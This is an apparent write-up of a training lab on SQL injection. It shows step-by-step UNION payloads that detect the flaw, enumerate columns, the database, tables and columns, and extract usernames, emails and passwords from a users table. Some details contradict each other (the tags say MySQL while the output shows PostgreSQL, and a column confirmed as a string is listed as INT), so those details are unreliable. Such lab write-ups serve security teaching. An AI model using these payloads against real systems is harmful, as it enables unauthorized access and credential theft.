# SQL injection UNION attack, retrieving data from other tables

**Tags:** `UNION attack` · `MySQL` · `information_schema` · `credential extraction`

---

## 1. Detection

Navigated to `/filter?category=Pets` and appended a single quote (`'`) to the category value. The server returned an **Internal Server Error**, confirming unsanitized input and likely no prepared statements — the value is wrapped in single quotes in the backend query.

```sql
Pets' AND 1=1--+   -- results returned
Pets' AND 1=2--+  -- no results
```

Also the, the database supports `true` and `false` directives, signalling it's a Non-Oracle Database.

## 2. Column count enumeration

Used `ORDER BY` to find the number of columns. Incrementing the index until `ORDER BY 3` threw an error, narrowing it to **2 columns**. The page also visually confirms this by showing only a title and description per item.

Additional payloads:-

```sql
Pets' UNION SELECT NULL,NULL--+ [ No Error ]
Pets' UNION SELECT NULL,NULL,NULL--+ [ Internal Server Error]
Pets' UNION SELECT NULL--+ [ Internal Server Error ]
```

Understanding the data-types returned by the columns.

- Manually checking each column type.
    - Column 1
        - `Pets' UNION SELECT 1,NULL--+` - **[Internal Server Error]**
        - `Pets' UNION SELECT 1.1,NULL--+` - **[Internal Server Error]**
        - `Pets' UNION SELECT '1.1',NULL--+` - **[No Error]**
        - Confirm that column 1 is `STRING` type.
    - Column 2
        - `Pets' UNION SELECT NULL,1--+` - **[Internal Server Error]**
        - `Pets' UNION SELECT NULL,1.1--+` - **[Internal Server Error]**
        - `Pets' UNION SELECT NULL,'1.1'--+` - **[No Error]**
        - Confirming that column 2 is `STRING` type.
- Therefore, The following types were identified:

| Column   | Data Type |
|----------|-----------|
| Column 1 | INT       |
| Column 2 | VARCHAR   |

## 3. Identifying Database
- Since we know both the columns are of string type, we can use `version()` function which returns a string on any column.
- I used `n00b` as an identifier to find the results faster using <kbd>CTRL + F</kbd>.
- Used the following database.
```sql
Pets' UNION SELECT version(),'n00b'--+
```
- Did <kbd>CTRL + F</kbd> searched for `n00b` and got the database version string in response.

**Output:**
```
PostgreSQL 12.22 (Ubuntu 12.22-0ubuntu0.20.04.4) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0, 64-bit
```

Further enumeration confirmed the database context:

```sql
Pets' UNION SELECT CONCAT(current_database(),':',current_user,':',current_schema()),NULL--+
```

**Output:**
```
academy_labs:peter:public
```

## 4. Table and column discovery

Queried `information_schema.tables` to list all user-created base tables in the public schema:

```sql
Pets' UNION SELECT (SELECT TABLE_NAME),NULL FROM information_schema.tables WHERE table_schema='public' AND table_type='BASE TABLE'--+
```

**Output:**
```
products
users
```

Queried `information_schema.columns` to list all columns in the `users` table:

```sql
Pets' UNION SELECT (SELECT COLUMN_NAME),NULL FROM information_schema.columns WHERE table_name='users'--+
```

**Output:**
```
email
username
password
```

## 5. Solving the Lab

Used the following payload to extract the credentials for all users, found `administrator` credentials, logged in to admin account and solved the lab.

```sql
Pets' UNION SELECT CONCAT(email,':',username,':',password),NULL FROM users--+
```